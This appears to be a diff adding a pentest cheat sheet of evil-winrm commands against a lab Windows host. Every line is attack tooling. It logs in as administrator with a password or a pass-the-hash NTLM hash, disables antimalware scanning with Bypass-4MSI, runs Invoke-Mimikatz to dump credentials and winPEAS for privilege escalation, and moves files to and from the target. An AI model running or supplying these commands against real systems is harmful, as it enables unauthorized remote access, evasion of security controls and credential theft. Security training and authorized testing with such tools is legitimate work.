@@ -1,0 +1,29 @@
+#Login with password
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987
+
+#Login with password and SSL
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -S
+
+#Login with hash
+evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38
+
+#Load script
+evil-winrm -i 192.168.X.X -u administrator -p Ignite@987 -s /opt/privesc/powershell
+Bypass-4MSI
+Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+
+#Save logs
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -l
+
+#Run exes
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
+Bypass-4MSI
+menu
+Invoke-Binary /opt/privsc/winPEASx64.exe
+
+#upload file
+upload /path/to/the/file .
+
+#download
+download file.txt /kali/
